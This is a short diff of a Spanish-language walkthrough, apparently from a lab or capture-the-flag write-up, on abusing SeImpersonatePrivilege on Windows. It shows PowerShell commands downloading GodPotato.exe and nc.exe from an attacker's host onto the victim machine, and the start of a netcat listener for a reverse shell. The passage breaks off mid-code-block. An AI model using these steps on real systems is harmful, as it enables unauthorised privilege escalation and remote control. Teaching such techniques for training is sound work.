@@ -20,9 +20,9 @@ Invoke-WebRequest -Uri "http://myipaddress:8000/GodPotato.exe" -OutFile "GodPota
 Invoke-WebRequest -Uri "http://myipaddress:8000/nc.exe" -OutFile "nc.exe"
 ```
 
-Comprobamos que ambos binarios hayan sido transferidos correctamente:
-``
-dir GodPotato.exe
-dir nc.exe
-``
-Con las herramientas disponibles en la máquina víctima, podemos continuar con la explotación de ```SeImpersonatePrivilege.```
+Con `GodPotato.exe` y `nc.exe` ya transferidos a la máquina víctima, procedemos a explotar `SeImpersonatePrivilege`.
+
+Primero configuramos `netcat` en la máquina atacante para recibir la conexión:
+
+```bash
+nc -lvnp 4444
